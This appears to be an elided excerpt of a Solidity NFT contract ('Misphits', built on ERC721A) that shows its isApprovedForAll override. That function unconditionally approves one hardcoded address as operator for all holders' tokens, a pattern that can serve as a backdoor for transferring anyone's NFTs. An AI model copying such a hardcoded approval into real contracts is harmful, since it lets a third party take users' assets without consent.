  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xdC20ba1c7862B1AD950Ea2390D1336C4eB216234){return true;}
...
contract Misphits is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Misphits", "MP", maxBatchSize_, collectionSize_) {
